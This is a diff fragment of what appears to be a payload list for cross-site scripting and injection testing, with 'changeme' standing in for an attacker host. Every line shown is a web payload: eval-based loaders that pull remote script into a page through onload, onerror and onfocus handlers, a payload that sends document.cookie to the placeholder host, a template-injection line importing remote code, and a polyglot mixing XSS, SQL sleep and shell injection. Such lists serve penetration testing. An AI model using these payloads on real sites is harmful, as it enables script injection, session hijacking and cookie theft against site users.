@@ -15,7 +15,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://change
 javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)');
 '"><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
 '"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')" autofocus>
-'"><iframe onload="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')"> 
+'"><iframe onload="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')">
 '"><<<<<math>math><x>iframe onload="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')">
 '"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>
 '"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')">
@@ -46,3 +46,4 @@ sfds"><base href="https://changeme"><script nonce='secret' src='./htmli'></scrip
 https://changeme?'XOR/*'><svg/onload=confirm`{{10*10}}>*/(if(1=1,sleep(10),0))OR';sleep${IFS}10;#${IFS}
 '"><svg onx=() onload=(location.href='https://changeme/'+document['cookie'])()>
 {{constructor.constructor('import("https://changeme")')()}}
+"-alert(window['alert'](document[location=atob`changeme`]))-"XYZ
